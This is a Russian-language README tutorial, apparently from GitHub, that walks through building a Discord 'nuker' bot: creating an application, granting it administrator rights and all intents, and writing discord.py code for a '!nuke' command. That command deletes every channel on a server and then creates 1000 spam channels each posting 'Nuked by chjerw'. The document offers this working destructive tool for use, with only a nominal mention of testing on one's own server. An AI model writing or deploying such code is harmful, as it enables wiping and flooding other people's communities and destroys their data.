# DiscordNuker
Добро пожаловать на туториал по созданию бота-нюкера для Discord.
Это подробная инструкция поможет вам с нуля создать такой бот и вцелом разобратся как работают боты в Discord.

## Создание бота
Для начала создаем сервер в Discord на котором будем тестить нашего бота.
<img width="1919" height="945" alt="image" src="https://github.com/user-attachments/assets/24382de0-55d8-4c48-98c1-b5c8d25facf9" />

Далее, переходим [сюда](https://discord.com/developers/applications/) и создаем новое приложение.
<img width="1917" height="948" alt="image" src="https://github.com/user-attachments/assets/2ce063b3-05bb-44d9-acba-8583c1b3ba57" />

Затем переходим в категорию <b>Бот</b> и активируем эту галочку.
Это нужно для того чтобы только вы могли добавлять бота на сервер.
<img width="1919" height="945" alt="image" src="https://github.com/user-attachments/assets/b77f2379-b786-43aa-ad6e-df3b39db4a6b" />

Потом переходим в <b>OAuth2</b> и кликаем <b>bot</b>, а затем в открывшемся меню выбираем <b>Администратор</b>.
После чего копируете ссылку и добавляете бота на ваш сервер.
<img width="1917" height="947" alt="image" src="https://github.com/user-attachments/assets/7cd71cd4-5db3-4c8d-a94b-7529645c58a1" />

Теперь нужно сбросить токен в категории <b>Бот</b> и скопировать его.

#### Совсем забыл, обязательно включите все три галочки:
<img width="1485" height="491" alt="image" src="https://github.com/user-attachments/assets/776ac2dc-2942-457a-ab29-c1e16f91dc4f" />

## Код
Создайте python-файл и скачайте библиотеку <b>discord.py</b>
```bash
pip install discord.py
```

Теперь приступаем к коду, сначала импортируем нужные библиотеки:
```python
import discord
from discord.ext import commands
import asyncio
```
Далее даём боту все права и создаем самого бота.
```python
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
```
<b>command_prefix</b> определяет какой тригер будет у наших команд, например если
```python
command_prefix="."
```
то команду в чате мы будем писать так:
```bash
.command
```
Далее нужно создать переменные для настройки нюка:
```python
count = 1000
channel_name = "Nuked by chjerw"
channel_message = "💣 Nuked by **chjerw** "
```
Тут ставьте что хотите!

Теперь создаем саму команду <b>!nuke</b>:
```python
@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()

    for i in range(count):
        channel = await ctx.guild.create_text_channel(channel_name+f"-{i}")
        await channel.send(channel_message)
```
Логика тут простая, если бот видит что в чате написали <b>!nuke</b>, то он удаляет каждый канал из списка всех каналов (то есть удаляет всё что есть на сервере).
Потом он создает каналы с названиями <b>channel_name</b> и сообщениями <b>channel_message</b> внутри них.
Количество создаваемых каналов определяет переменная <b>count</b>.
